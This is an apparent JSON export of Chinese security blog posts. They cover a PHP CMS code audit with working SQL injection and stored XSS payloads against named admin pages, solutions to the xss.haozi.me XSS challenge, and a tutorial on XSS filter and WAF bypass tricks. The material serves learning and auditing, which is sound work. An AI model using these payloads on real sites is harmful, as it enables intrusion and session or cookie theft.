?r=login\");\nexit;\t\n&#125;\n?>\n这个是检验是否登录的因此这里不存在过滤，接下来去尝试一下SQL注入尝试闭合\nr=editcolumn&amp;type=2&amp;id=1'  --+ \n成功，接下来查看字段数字段数为9，接下来查看回显位3、4、5、8都可以，随便整一个开始注入\nr=editcolumn&amp;type=2&amp;id=-1' union select 1,2,database(),4,user(),6,7,@@version,9 --+ \n\n成功注入\nadmin/files/editsoft.php部分源码如下\n&lt;?php\nrequire '../inc/checklogin.php';\nrequire '../inc/conn.php';\n$wzlistopen='class=\"open\"';\n$id=$_GET['id'];\n$query = \"SELECT * FROM download WHERE id='$id'\";\n$resul = mysql_query($query) or die('SQL语句有误：'.mysql_Aerror());\n$download = mysql_fetch_array($resul);\n可以看出是类似于上面那个文件的，尝试用上关方法去进行SQL注入查询字段数\n字段数为18，查看回显位开始联合查询\nr=editsoft&amp;type=2&amp;id=-1'union select 1,database(),3,4,5,6,7,8,9,user(),@@version,12,13,14,15,16,17,18--+\n\n成功注入\ndownloads. php这里的话可以发现是id参数是被&#39;)包裹的，且来自于变量fileid，fileid变量是由cid参数经过addlashes函数后得到的，那这里的话单引号肯定就会被转义了，想闭合语句的话不太可能，所以这里的话SQL注入是没戏，这里算是G了。\ninstall/index.php在此处发现有update语句和可控的变量password和username，查看这两个变量的传入方式可以发现是直接传入的，没有什么过滤，那么这里就可以在user变量处尝试SQL注入了单引号测试结果如下尝试报错注入\n1' and (extractvalue(1,concat(0x7e,(select database()),0x7e)))#\n\n\n爆表\n1' and (extractvalue(1,concat(0x7e,(select table_name from information_schema.tables where table_schema=database()  limit 1,1),0x7e)))#\n\n\nXSSadmin/files/adset.php关键代码如下\n&lt;div class=\"form-group\">\n&lt;label class=\"col-lg-4 control-label\">广告一&lt;/label>\n&lt;div class=\"col-lg-8\">\n&lt;textarea name=\"ad1\" class=\"form-control col-lg-12\" placeholder=\"ad-1\">&lt;?php echo $ad['ad1']?>&lt;/textarea>                                  \n&lt;/div>\n&lt;/div>\n可以发现这里的变量ad1是可控的，然后他是在&lt;/textarea&gt; 标签中，如果闭合了这个标签，是不是就意味着我们可以构造自己的语句，也就可以写xss了，此时看一下传变量的方式\n&lt;?php\nrequire '../inc/checklogin.php';\nrequire '../inc/conn.php';\n$setopen='class=\"open\"';\n$query = \"SELECT * FROM adword\";\n$resul = mysql_query($query) or die('SQL语句有误：'.mysql_error());\n$ad = mysql_fetch_array($resul);\n\n$save=$_POST['save'];\n$ad1=addslashes($_POST['ad1']);\n$ad2=addslashes($_POST['ad2']);\n$ad3=addslashes($_POST['ad3']);\nif ($save==1)&#123;\n$query = \"UPDATE adword SET \nad1='$ad1',\nad2='$ad2',\nad3='$ad3',\ndate=now()\";\n@mysql_query($query) or die('修改错误：'.mysql_error());\necho \"&lt;script>alert('亲爱的，广告设置成功更新。');location.href='?r=adset'&lt;/script>\"; \nexit;\n&#125;\n?>\n发现是POST传值，这里还有addslashes函数，但变量未被单引号包裹，我们不需要单引号，这就意味着这个是没有什么作用的，尝试xss\nad1=&lt;/textarea>&lt;script>alert(1)&lt;/script>&amp;save=1\n\n\nadmin/login刚刚我们测试过它存在SQL注入漏洞，并且知道它是单引号闭合，既然我们可以后面写入报错语句，那岂不是也可以写入我们的xss语句，尝试一下\n1'adn&lt;script>alert(1)&lt;/script>#\n\n\n调用一下cookie\ninstall/index.php\n总结从这两个简单的CMS代码审计中学到了一点知识，简单的总结一下\n不同CMS异同大部分没MVC框架的CMS，他们的结构是比较相似的，我们可以看一下这两个CMS的结构可以发现两者的结构是比较相像的，当我们掌握文件夹的功能时，就能够使得我们的代码审计轻松许多，因此通过文件夹掌握其功能含义是我们首先需要做到的\n区别的话就是有的程序员会把css单独作为文件夹(例如这里的xhcms)，有的会把js文件单独作为文件夹(这里的bluecms)，不过这些都是无关紧要的，大致知道文件夹是什么含义，存放的文件是什么就可以\n常见关注点SQL注入：\nselect insert update mysql_query mysqli等\n文件上传：\n$FILES，type=\"file\"，上传，move_upload_file( )等\nXSS跨站：\nprint，print_r，echo，sprintf，die，var_dump，var_export等\n文件包含：\ninclude，include_once，require，require_once等\n代码执行：\neval，assert，preg，replace，call，user，func，call_user_func，array等\n命令执行：\nsystem，exec，shell_exec，``，passthru，pcntl_exec，popen，proc_open等\n变量覆盖：\nextract() parse_str() importrequestvariables() $$\n反序列化：\nserialize() unserialize() _construct _destruct等\n个人感想我们挖掘出一个漏洞的时候，它可能不仅仅只是这一个漏洞，举个例子。当我们关注一个地方的SQL注入的话，就是找SELECT * from此类语句，同时如果它存在SQL注入的话，那它可能不仅仅是SQL注入点，也可能是XSS点，因为后面语句可控的话，插上一个&lt;script&gt;alert(1)&lt;/script&gt;也并非难事，但这些SQL语句也并不少，这就需要我们观察语句是否可控，同时看是否过滤了，是否过滤十分严格以致于不存在漏洞，总之多多进行测试，实践出真知。\n参考文章https://xz.aliyun.com/t/7992https://xz.aliyun.com/t/11310https://www.cnblogs.com/Cl0ud/p/12824593.htmlhttps://www.cnblogs.com/wkzb/p/12732078.htmlhttps://www.cnblogs.com/zjhzjhhh/p/14338775.htmlhttps://blog.csdn.net/weixin_44770698/article/details/125656478\n","slug":"从多个基础CMS入坑代码审计","date":"2022-07-20T17:41:30.000Z","categories_index":"代码审计","tags_index":"代码审计","author_index":"quan9i"},{"id":"ff5ef1580e1509b5812626f28a444a2d","title":"XSS常见绕过姿势和绕某狗WAF所用标签小记","content":"前言XSS学习过后，想刷一些题，github找到一个，链接如下https://xss.haozi.me/\n0X00function render (input) &#123;\n  return '&lt;div>' + input + '&lt;/div>'\n&#125;\n\n看到服务端是没有任何防护的，直接简单的xss语句即可\n&lt;script>alert(1)&lt;/script>\n\n0X01function render (input) &#123;\n  return '&lt;textarea>' + input + '&lt;/textarea>'\n&#125;\n\n发现前后多了个&lt;textarea&gt;标签，那我们这里的话，直接把前面给闭合了，后面就可控了，此时再插入我们的xss语句即可\n&lt;/textarea>&lt;script>alert(1)&lt;/script>\n\n0X02方法一function render (input) &#123;\n  return '&lt;input type=\"name\" value=\"' + input + '\">'\n&#125;\n\n这题的话看后端代码是把值加到value里了，同时把这个限制到了input里，那我们这里可以把value闭合，把input标签也闭合，然后写入自己的语句，此时即可实现xss\n\">&lt;script>alert(1)&lt;/script>\n\n方法二input语句中也可以实现xss，我们把value闭合后，可以添加onclick属性，来实现xss，构造payload如下\n\" onclick=\"alert(1)\n\n\n0X03实体编码绕过function render (input) &#123;\n  const stripBracketsRe = /[()]/g\n  input = input.replace(stripBracketsRe, '')\n  return input\n&#125;\n\n/g修饰符用于执行全局匹配（查找所有匹配而非在找到第一个匹配后停止）。总之这里的过滤就是过滤了()，这个时候的话我们的思路有一个就是编码绕过，我们的属性在标签中，在触发前就对其进行了一次解码，因此我们这里可以进行编码绕过，构造payload如下\n&lt;a href=javascript:&amp;#97;&amp;#108;&amp;#101;&amp;#114;&amp;#116;&amp;#40;&amp;#49;&amp;#41>123&lt;a>\n\n反引号绕过可以用`来代替括号，构造payload如下\n&lt;script>alert`1`&lt;/script>\n\n0X04function render (input) &#123;\n  const stripBracketsRe = /[()`]/g\n  input = input.replace(stripBracketsRe, '')\n  return input\n&#125;\n\n相比上关多过滤了反引号，这里沿用上关思路即可，编码绕过\n&lt;a href=javascript:&amp;#x61;&amp;#x6c;&amp;#x65;&amp;#x72;&amp;#x74;&amp;#x28;&amp;#x31;&amp;#x29;>123&lt;/a>\n\n0X05function render (input) &#123;\n  input = input.replace(/-->/g, '😂')\n  return '&lt;!-- ' + input + ' -->'\n&#125;\n\n这里把内容都给注释了，毋庸置疑这里我们需要闭合这个注释符，但是过滤了--&gt;，不过我们还可以用--!&gt;来进行闭合，构造payload如下\n--!>&lt;script>alert(1)&lt;/script>\n\n0X06function render (input) &#123;\n  input = input.replace(/auto|on.*=|>/ig, '_')\n  return `&lt;input value=1 $&#123;input&#125; type=\"text\">`\n&#125;\n\n这里的话可以看见是过滤了auto.*=和on.*=以及&gt;，防护的很好，但仍存在一些漏洞，就是这个他过滤的这个属性和=是无缝衔接的，如果我们进行换行，让他不满足这个过滤条件，那么这个过滤不加无效了吗，构造payload如下\nonclick\n=alert(1)\n\n0X07function render (input) &#123;\n  const stripTagsRe = /&lt;\\/?[^>]+>/gi\n\n  input = input.replace(stripTagsRe, '')\n  return `&lt;article>$&#123;input&#125;&lt;/article>`\n&#125;\n\n这里的话不难看出是过滤了&lt;&gt;这个标签，但单个的&lt;和&gt;仍是可以使用的，这个时候我们可以借助注释符来实现闭合，构造payload如下\n&lt;img src=1 onerror=alert(1)//\n\n0X08function render (src) &#123;\n  src = src.replace(/&lt;\\/style>/ig, '/* \\u574F\\u4EBA */')\n  return `\n    &lt;style>\n      $&#123;src&#125;\n    &lt;/style>\n  `\n&#125;\n\n过滤了&lt;/style&gt;，同之前类似，可采用空格和换行绕过\n&lt;/style >&lt;script>alert(1)&lt;/script>\n&lt;/style\n>&lt;script>alert(1)&lt;/script>\n\n0X09function render (input) &#123;\n  let domainRe = /^https?:\\/\\/www\\.segmentfault\\.com/\n  if (domainRe.test(input)) &#123;\n    return `&lt;script src=\"$&#123;input&#125;\">&lt;/script>`\n  &#125;\n  return 'Invalid URL'\n&#125;\n\n这里的要求就是input的需要含有https://www.segmentfault.com，这个时候我们看语句的话，发现它是被一对双引号包裹的，我们输入一个双引号就可以实现自由插入属性，但此时是不能够xss的，所以我们需要再闭合标签，即添加&quot;&gt;&lt;/script&gt;来闭合，而后添加我们的语句即可\nhttps://www.segmentfault.com\">&lt;/script>&lt;img src=\"\" onerror=alert(1)>\nhttps://www.segmentfault.com\">&lt;/script>&lt;script>alert(1)&lt;/script>\n\n0X0Afunction render (input) &#123;\n  function escapeHtml(s) &#123;\n    return s.replace(/&amp;/g, '&amp;amp;')\n            .replace(/'/g, '&amp;#39;')\n            .replace(/\"/g, '&amp;quot;')\n            .replace(/&lt;/g, '&amp;lt;')\n            .replace(/>/g, '&amp;gt;')\n            .replace(/\\//g, '&amp;#x2f')\n  &#125;\n\n  const domainRe = /^https?:\\/\\/www\\.segmentfault\\.com/\n  if (domainRe.test(input)) &#123;\n    return `&lt;script src=\"$&#123;escapeHtml(input)&#125;\">&lt;/script>`\n  &#125;\n  return 'Invalid URL'\n&#125;\n这里发现过滤了很多，&amp;、/、&lt;、&gt;、/、&#39;这些都被ban了，这里的话就需要一个知识点了，在SSRF中也比较常用，就是添加@，看似是访问前者，实际访问的是后者，比如访问https://wwwbaidu.com@quan9i.top时，实际访问的就是https://quan9i.top这里的话我们可以发现作者在靶场中留下了一个j.js文件，我们就可以让它访问这个，从而触发xss构造payload如下（用火狐浏览器）\nhttps://www.segmentfault.com@xss.haozi.me/j.js\n\n\n0X0Bfunction render (input) &#123;\n  input = input.toUpperCase()\n  return `&lt;h1>$&#123;input&#125;&lt;/h1>`\n&#125;\ntoUpperCase()函数使得输入的内容全为大写，本来我构造的payload是这样的\n&lt;a href=javascript:alert(1)>123//\n但大写的alert(1)无法成功触发xss，这里的话我们看到这个内容是在标签中的，我们可以把alert(1)进行实体编码，在服务器端会自动解码，因此构造最终payload如下\n&lt;a href=javascript:&amp;#x61;&amp;#x6c;&amp;#x65;&amp;#x72;&amp;#x74;&amp;#x28;&amp;#x31;&amp;#x29;>123//\n\n0X0Cfunction render (input) &#123;\n  input = input.replace(/script/ig, '')\n  input = input.toUpperCase()\n  return '&lt;h1>' + input + '&lt;/h1>'\n&#125;\n在上关的基础上多过滤了个script标签，这里的话我们直接把script进行实体编码即可绕过\n&lt;a href=java&amp;#x73;&amp;#x63;&amp;#x72;&amp;#x69;&amp;#x70;&amp;#x74;:&amp;#x61;&amp;#x6c;&amp;#x65;&amp;#x72;&amp;#x74;&amp;#x28;&amp;#x31;&amp;#x29;>123//\n当然，也可以不用这个标签，换其他标签，例如img\n&lt;img src=0 onerror=&amp;#x61;&amp;#x6c;&amp;#x65;&amp;#x72;&amp;#x74;&amp;#x28;&amp;#x31;&amp;#x29;>\n0X0Dfunction render (input) &#123;\n  input = input.replace(/[&lt;/\"']/g, '')\n  return `\n    &lt;script>\n          // alert('$&#123;input&#125;')\n    &lt;/script>\n  `\n&#125;\n这里的话可以看出它是把我们写的内容放注释里了，同时过滤了&quot;、&#39;、/，这个时候的话，绕过注释简单，我们只需要一个换行即可，而后插入alert(1)，但此时存在一个问题，就是后面多出了个’)，我们需要注释，但/被ban了，该怎么办呢，这个时候就需要说一下html了，它还有注释方法是&lt;!-- xxx --&gt;这种，因此我们添加–&gt;来闭合即可，构造最终payload如下\n\nalert(1)\n-->\n\n0X0E题目代码如下\nfunction render (input) &#123;\n  input = input.replace(/&lt;([a-zA-Z])/g, '&lt;_$1')\n  input = input.toUpperCase()\n  return '&lt;h1>' + input + '&lt;/h1>'\n&#125;\n这里的话给标签都添加了下划线，这个时候的话新添标签就无效了，这个时候可以用ſ来代替s，但alert(1)大写的话是无用的，因此需要用其他属性了，这个时候可以用src，结合作者的js文件，触发xss\n&lt;ſcript src=\"https://xss.haozi.me/j.js\">&lt;/script>\n\n0X0Ffunction render (input) &#123;\n  function escapeHtml(s) &#123;\n    return s.replace(/&amp;/g, '&amp;amp;')\n            .replace(/'/g, '&amp;#39;')\n            .replace(/\"/g, '&amp;quot;')\n            .replace(/&lt;/g, '&amp;lt;')\n            .replace(/>/g, '&amp;gt;')\n            .replace(/\\//g, '&amp;#x2f;')\n  &#125;\n  return `&lt;img src onerror=\"console.error('$&#123;escapeHtml(input)&#125;')\">`\n&#125;\n 使用escapeHTML，将字符串&lt;script&gt;alert(1)&lt;/script转为 &amp;lt;script&amp;gt;alert(1);&amp;lt;/script&amp;gt;此时，浏览器将能正确解析，因为浏览器接收到实体字符后，转成对应的尖括号等 因此这里是没啥影响的，所以这里的话就是consonle.error(&#39;x&#39;)，我们可控的是x，那我们如果想进行xss，首先肯定要避开这个括号，因此我们先进行闭合，构造&#39;);，此时再添加我们的弹窗语句alert(1)，此时后面还有一个&#39;)，我们需要闭合它使语句正常，所以添加一个(&#39;来闭合语句，最终payload\n');alert('1\n0X10function render (input) &#123;\n  return `\n&lt;script>\n  window.data = $&#123;input&#125;\n&lt;/script>\n  `\n&#125;\n这个可以在随便一个网页上进行测试，windows.data=alert(1)就可以触发xss\n因此这里直接输入alert(1)即可\nalert(1)\n0X11题目代码如下\n// from alf.nu\nfunction render (s) &#123;\n  function escapeJs (s) &#123;\n    return String(s)\n            .replace(/\\\\/g, '\\\\\\\\')\n            .replace(/'/g, '\\\\\\'')\n            .replace(/\"/g, '\\\\\"')\n            .replace(/`/g, '\\\\`')\n            .replace(/&lt;/g, '\\\\74')\n            .replace(/>/g, '\\\\76')\n            .replace(/\\//g, '\\\\/')\n            .replace(/\\n/g, '\\\\n')\n            .replace(/\\r/g, '\\\\r')\n            .replace(/\\t/g, '\\\\t')\n            .replace(/\\f/g, '\\\\f')\n            .replace(/\\v/g, '\\\\v')\n            // .replace(/\\b/g, '\\\\b')\n            .replace(/\\0/g, '\\\\0')\n  &#125;\n  s = escapeJs(s)\n  return `\n&lt;script>\n  var url = 'javascript:console.log(\"$&#123;s&#125;\")'\n  var a = document.createElement('a')\n  a.href = url\n  document.body.appendChild(a)\n  a.click()\n&lt;/script>\n可以发现这里除了()之外都进行了过滤，然后看到  var url = &#39;javascript:console.log(&quot;$&#123;s&#125;&quot;)&#39;这个语句，这里我们只需要构造出单独的alert(1)就可以成功触发xss，所以我们先闭合这个语句，这时候用&quot;);来进行闭合，而后添加我们的alert(1),此时因为后面多出了&quot;)，我们需要闭合，所以加上(&quot;，最终payload如下\n\");alert(1)(\"\n\n0X12题目如下\n// from alf.nu\nfunction escape (s) &#123;\n  s = s.replace(/\"/g, '\\\\\"')\n  return '&lt;script>console.log(\"' + s + '\");&lt;/script>'\n&#125;\n仅仅只过滤了/,这里的话我们直接把这个标签给闭合了，自己再构造一个script标签来写入我们的xss代码即可\n&lt;/script>&lt;script>alert(1)&lt;/script>\n\n","slug":"XSS.haozi.me刷题","date":"2022-07-11T10:32:20.000Z","categories_index":"WEB知识","tags_index":"XSS","author_index":"quan9i"},{"id":"ff5ef1580e1509b5812626f28a444a2d","title":"XSS常见绕过姿势和绕某狗WAF所用标签小记","content":"前言之前在XSS方面只有很浅的了解，再次学习过后，这里对其部分知识进行总结，同时用例题来讲解，希望能对在学习XSS的师傅有所帮助\n什么是XSSXSS，全拼Cross Site Scripting，中文含义是跨站脚本攻击，为了不和层叠样式表(Cascading Style Sheets, CSS)的缩写混淆，故将跨站脚本攻击缩写为XSS\n漏洞原理恶意攻击者在网站中插入恶意script代码，当web用户访问此网站时，恶意script代码被触发，就达到了攻击用户的目的，获取了用户的部分信息\n漏洞危害1、窃取管理员帐号或Cookie，入侵者可以冒充管理员的身份登录后台。使得入侵者具有恶意操纵后台数据的能力，包括读取、更改、添加、删除一些信息。\n2、窃取用户的个人信息或者登录帐号，对网站的用户安全产生巨大的威胁。例如冒充用户身份进行各种操作。\n3、网站挂马。先将恶意攻击代码嵌入到Web应用程序之中。当用户浏览该挂马页面时，用户的计算机会被植入木马。\n4、发送广告或者垃圾信息。攻击者可以利用XSS漏洞植入广告，或者发送垃圾信息，严重影响到用户的正常使用。\n\n漏洞分类反射型XSS反射型XSS也被称为非持久性XSS，当用户访问一个带有XSS代码的HTML请求时，服务器端接收数据后处理，然后把带有XSS的数据发送到浏览器，浏览器解析这段带有XSS代码的数据后，就造成XSS漏洞，这个过程就像一次反射，所以叫反射型XSS。\n攻击流程如下\n1、攻击者发送带有XSS恶意的脚本链接给客户(该链接是正常服务器存在注入点的链接，且带着我们注入的内容)\n2、客户点击了恶意链接并访问了正常服务器\n3、服务器将XSS与页面信息返回客户端\n4、客户端解析后请求恶意服务器\n5、攻击者读取用户信息\n\n存储型XSS存储型XSS又被称为持久性XSS，存储型XSS是最危险的一种跨站脚本漏洞，当攻击者提交一段 XSS代码后，被服务端接收并存储，当攻击者或用户再次访问某个页面时，这段XSS代码被程序读出来响应给浏览器，造成XSS跨站攻击，这是存储型XSS。\n流程如下\n1、攻击者在正常服务器中注入XSS代码，且被服务器储存在了数据库中\n2、用户在网站登录状态下，访问了恶意服务器，且浏览了存在恶意脚本的页面\n3、正常服务器将页面信息与XSS脚本一同返回\n4、客户端解析了页面信息与XSS脚本代码，这时脚本代码会被执行，甚至会向攻击者的恶意服务器主动发起请求\n5、此时，攻击者就可以从自己的恶意服务器中读取用户数据\n\nDOM型不经过后端,DOM—based XSS漏洞是基于文档对象模型Document Objeet Model,DOM)的一种漏洞,dom - xss是通过url传入参数去控制触发的。(属于是反射型的特殊情况)可能触发类型\ndocument.referer\nwindow.name\nlocation\ninnerHTML\ndocumen.write\n攻击常用标签script标签1、&lt;script>alert(1)&lt;/alert>//弹出1\n2、&lt;script>alert(\"xss\"）&lt;/alert>//弹出xss\n3、&lt;script>alert(/xss/）&lt;/alert>//弹出xss\nimg标签&lt;img  src=javascript:alert(1)>\n//调用js代码弹1\n&lt;img  src=1  οnerrοr=alert(1)> \n//访问1这个地址对应的图片，如果错误就执行onerror里的代码，因为1不是一个链接，故会执行后面的语句，从而弹出1\n&lt;img src=1 onmouseover=\"alert(1)\">\n//鼠标指针移动到元素时触发弹出1\na标签&lt;a href=javascript:alert('xss')>quan9i&lt;/a>\n//点击quan9i这个链接触发js，弹出xss\n&lt;a href=\"\" onclick=alert('xss')>a&lt;/a>\n//原理同上\ninput标签&lt;input onfocus=\"alert('xss');\">\n&lt;input onblur=alert(\"xss\") autofocus>&lt;input autofocus>\n//使得焦点自动到元素上，自动触发代码，弹出xss\nbody标签&lt;body οnlοad=alert(1)>\nsvg标签&lt;svg onload=alert(1)>\niframe标签&lt;iframe onload=alert(\"xss\");>&lt;/iframe>\n//onload:当页面加载完毕时执行代码，在这里也就是弹出xss\n常用绕过姿势双写及大小写绕过在遇到直接把script替换为空的过滤方式时，可以采用双写方式，构造script，举个栗子&lt;scrscriptipt&gt;，此时按照过滤方式，中间的script被替换为空，那此时剩下的部分就是&lt;script&gt;，也就成功绕过了。测试代码\n&lt;?php\n    function filter($payload)&#123;\n        $data=str_replace(\"script\",\"\",$payload);\n        return $data;\n    &#125;\n    $name=filter($_GET[\"name\"]);\n    echo \"hello $name\";\n?>\n正常情况\n&lt;script>alert(/quan9i/)&lt;/script>\n\n双写绕过时\nname=&lt;scrscriptipt>alert(/quan9i/)&lt;/scrscriptipt>\n\n\n可以发现成功绕过了，错误的过滤方式甚至可以帮助我们绕过GOOgle浏览器的XSS过滤器\n遇到没有考虑大小写时，可以通过大小写的变化来进行绕过，比如&lt;SCriPT&gt;测试代码\n&lt;?php\n    function filter($payload)&#123;\n        if(preg_match('/script/', $payload))&#123;\n            return \"hacker!!!\";   \n        &#125;\n        return $payload;\n    &#125;\n    $name=filter($_GET[\"name\"]);\n    echo \"you are $name\";\n?>\n正常情况\nname=&lt;script>alert('quan9i')&lt;/script>\n结果如下大小写绕过时\nname=&lt;SCRipt>alert('quan9i')&lt;/SCRipt>\n结果如下\n实体编码绕过（输出在标签属性中）如果&lt;和&gt;被过滤，我们无法引入新标签，此时可以引入标签的事件，例如onload这些，而如果存在内容过滤，例如这种\n$str2=str_replace(\"alert(1)\",\"ale_rt(1)\",$str);\n 此时我们就可以用HTML编码来绕过检测 得到\n&amp;#97;&amp;#108;&amp;#101;&amp;#114;&amp;#116;&amp;#40;&amp;#49;&amp;#41;\n这时候放入我们的事件中即可，比如是img标签，我们就可以引入一个onerror事件\n&lt;img src=1 oneerror=\"&amp;#97;&amp;#108;&amp;#101;&amp;#114;&amp;#116;&amp;#40;&amp;#49;&amp;#41;\"/>\n此时就可以触发弹窗，能触发与浏览器渲染页面的顺序有关。我们的payload在标签属性中，在触发事件前，浏览器已经对其进行了一次解码，也就把&amp;#97;&amp;#108;&amp;#101;&amp;#114;&amp;#116;&amp;#40;&amp;#49;&amp;#41;变成了alert(1)\n闭合语句绕过当遇到无法构造&lt;和&gt;被过滤时，我们可以闭合JavaScript语句，使得攻击语句逃逸，示例代码如下\n&lt;input name=\"xianzhi\"  value=\"'.$payload.'\" type=\"hidden\">\n此时的payload是可控的，我们构造payload为&quot; onclick=alert(1)  type=&quot;text&quot;//，此时在源代码中就是\n&lt;input name=\"xianzhi\"  value=\"\" onclick=alert(1) type=\"text\"//\" type=\"hidden\">\n此时后面相当于注释，不再看，而//则同时发挥了闭合的作用。使得成功弹窗但有经验的程序员往往会想到这点，从而直接将&#39;进行转义，进而防御xss，但在部分情况下仍然存在注入。例如SQL中的双输入情况\nselect * from users where name = '输入1' and pass =  '输入2';\n我们此时在输入1中输入\\，在输入2中输入union select xxxxxx#，就成功进行了攻击，此时语句为\nselect * from users where name = '\\' and pass =  'union select xxxxxx#';\n\\将第二个&#39;转义，导致第一个单引号与第三个单引号闭合，此时我们攻击语句构造完成后，在最后加上#，#把后面单引号注释，就成功实现了攻击语句逃逸。在XSS中也同样存在这种情况，示例代码\n&lt;?php\n    $name=$_GET['name'];\n    $name=htmlentities($name,ENT_QUOTES);\n    $address=$_GET['addr'];\n    $address=htmlentities($address,ENT_QUOTES);\n?>\n&lt;!DOCTYPE HTML>\n&lt;html>\n&lt;head>\n    &lt;meata charset=\"gb18030\">\n    &lt;title>xianzhi&lt;/title>\n&lt;/head>\n&lt;body>\n    &lt;script type=\"text/javascript\">\n        var url='http://xz.com/?name&lt;?=$name?>'+'&lt;?=$address?>';\n    &lt;/script>\n&lt;/body>\n&lt;/html>\n输入点有两个，分别是name和addr，输出点也是这两个，这里如果输入单引号的话，因为有htmlentities函数，所以会转换为实体编码，此时我们看这个语句\nvar url='http://xz.com/?name&lt;?=$name?>'+'&lt;?=$address?>';\n这个name变量后面是单引号，如果我们给它转义了，第一个就会与第三个闭合，我们再用//进行注释，就可以实现攻击语句逃逸，构造payload如下\nname=xianzhi\\&amp;addr=;alert(/xianzhi/);//\n执行结果\n\n绕过空格在做题时，可能会遇到一种情况就是将空格替换为空，此时我们的办法就是找代替空格的，在XSS常见绕过空格的方法\n%0a\n/**/\n绕WAF开启XX狗后，普通的XSS是无法实现绕过的这里的思路呢，就是利用不常用的标签和新的HTML5新标签来进行绕过，经过测试，将可用绕过的姿势总结如下\n姿势iframe标签&lt;iframe onload=\"alert(document.cookie)\">&lt;/iframe>\n\naudio标签&lt;audio src=1 onerror=alert(1)>\n\nvideo标签&lt;video src=x onerror=alert(48)>\n\nsvg标签\nbutton标签&lt;button onfocus=alert(1)>\n&lt;button onclick=alert(1)>\n\nobject标签这个方法需要借助data伪协议来配合使用\n&lt;object data=\"data:text/html;base64,PHNjcmlwdD5hbGVydCgncXVhbjlpJyk8L3NjcmlwdD4=\">&lt;/object>\n//内容经base64解密后为&lt;script>alert('quan9i')&lt;/script>\n\ndiv标签这个需要借助url编码来实现绕过\n&lt;div onmouseover%3d'alert%26lpar%3b1%26rpar%3b'>DIV&lt;%2fdiv>\n\n实战双写及大小写绕过0X01尝试&lt;script&gt;alert(1)&lt;/script&gt;发现直接将script给过滤了，这里的思路想到可能是双写绕过，因为这种直接过滤的一般都是把script替换为空。查看一下源码\n我们发现这里不仅过滤了script，我们这里可以换标签，再利用双写实现攻击语句逃逸，这时候我们用&quot;/&gt;闭合标签，自己再构造一个恶意的超链接即可，构造payload如下\n\"/>&lt;a hrhrefef=javascrscriptipt:alert(1)>1&lt;/a>\n//经测试href被过滤，所以这里也需要双写\n执行结果如下\n0X02输入&lt;script&gt;alert(1)&lt;/script&gt;\n查看源代码这里发现过滤了script，看起来与0x01那个题很像，我们此时尝试上关的payload\n\"/>&lt;a hrhrefef=javascrscriptipt:alert(1)>1&lt;/a>\n没有成功，此时查看源代码\n&lt;h2 align=center>没有找到和&amp;quot;/&amp;gt;&amp;lt;a href=javascript:alert(1)&amp;gt;1&amp;lt;/a&amp;gt;相关的结果.&lt;/h2>&lt;center>\n&lt;form action=level6.php method=GET>\n&lt;input name=keyword  value=\"\"/>&lt;a hr_ef=javascript:alert(1)>1&lt;/a>\">\n&lt;input type=submit name=submit value=搜索 />\n这里的话可以发现href被过滤了，可能还有其他方法？但经过尝试，暂未找到其他方法，这里的话考虑的就是大小写绕过了，其他好像也没啥方法了，双写绕过没戏，因此尝试一下大小写绕过\n\"/>&lt;a hRef=javasCript:alert(1)>1&lt;/a>\n\n实体编码绕过查看源码发现我们填的是在超链接中的，此时会跳转到对应界面，如果我们利用JavaScript来执行xss语句，是不是也能执行出来呢，此时我们进行测试。输入javascript:alert(1)进行测试查看源代码\n&lt;a href=\"您的链接不合法？有没有！\">友情链接&lt;/a>\n提示链接不合法，想着正常的链接一般是http://这种，我们随便输入一个尝试一下看是否正常\nhttp://quan9i.top\n点击后确实跳转了说明和我们想的一样，这里需要有http://，可是放前面的话JavaScript是无法触发的，那此时的思路就是放后面然后进行注释\njavascript:alert(1)//http://\n但是此时点击链接仍未出现弹窗，查看源代码\n&lt;a href=\"javascr_ipt:alert(1)//http://\">友情链接&lt;/a>\nscript被过滤，因此我们这里对script进行HTML实体编码，构造payload如下\njava&amp;#115;&amp;#99;&amp;#114;&amp;#105;&amp;#112;&amp;#116;:alert(1)//http://\n\n闭合语句绕过0X01\n进入界面后，发现没有按钮和搜素框，有点怪，看到参数有个keyword，先简单试一下xss\nkeyword=&lt;script>alert(1)&lt;/script>\n查看源代码\n&lt;h1 align=center>欢迎来到level10&lt;/h1>\n&lt;h2 align=center>没有找到和&amp;lt;script&amp;gt;alert(1)&amp;lt;/script&amp;gt;相关的结果.&lt;/h2>&lt;center>\n&lt;form id=search>\n&lt;input name=\"t_link\"  value=\"\" type=\"hidden\">\n&lt;input name=\"t_history\"  value=\"\" type=\"hidden\">\n&lt;input name=\"t_sort\"  value=\"\" type=\"hidden\">\n&lt;/form>\n&lt;/center>&lt;center>&lt;img src=level10.png>&lt;/center>\n&lt;h3 align=center>payload的长度:25&lt;/h3>&lt;/body>\n&lt;/html>\n可以看到我们keyword输入的内容被进行了HTML实体编码，所以基本没戏，同时发现三个隐藏的参数，对这三个参数进行赋值，看哪个会有回显\nkeyword=1&amp;t_link=test&amp;t_history=test&amp;t_sort=test\n查看源码\n&lt;h1 align=center>欢迎来到level10&lt;/h1>\n&lt;h2 align=center>没有找到和1相关的结果.&lt;/h2>&lt;center>\n&lt;form id=search>\n&lt;input name=\"t_link\"  value=\"\" type=\"hidden\">\n&lt;input name=\"t_history\"  value=\"\" type=\"hidden\">\n&lt;input name=\"t_sort\"  value=\"test\" type=\"hidden\">\n&lt;/form>\n&lt;/center>&lt;center>&lt;img src=level10.png>&lt;/center>\n发现t_sort参数是有回显的，不过呢，这个由于type是隐藏的，所以在界面上是无回显的，因此我们这里修改type为text或者button都是可以的，下图中的值都是可以的\n那想要构造的话，首先需要把value这个给闭合了，所以payload首先需要一个&quot;，而后构造onclick事件，点击触发xss即可，思路有了，构造payload也就好办了，构造payload如下\nkeyword=1&amp;t_sort=\"type=\"checkbox\" onclick=alert(1)//\n此时语句就是\n&lt;input name=\"t_sort\"  value=\"\"type=\"checkbox\" onclick=alert(1)//\" type=\"hidden\">\n也就是&lt;input name=\"t_sort\"  value=\"\"type=\"checkbox\" onclick=alert(1)//\n\n0X02没有搜索框，只有一个参数此时我们随便输入个&lt;script&gt;然后查看源代码\n&lt;h1 align=center>欢迎来到level11&lt;/h1>\n&lt;h2 align=center>没有找到和&amp;lt;script&amp;gt;相关的结果.&lt;/h2>&lt;center>\n&lt;form id=search>\n&lt;input name=\"t_link\"  value=\"\" type=\"hidden\">\n&lt;input name=\"t_history\"  value=\"\" type=\"hidden\">\n&lt;input name=\"t_sort\"  value=\"test\" type=\"hidden\">\n&lt;input name=\"t_ref\"  value=\"\" 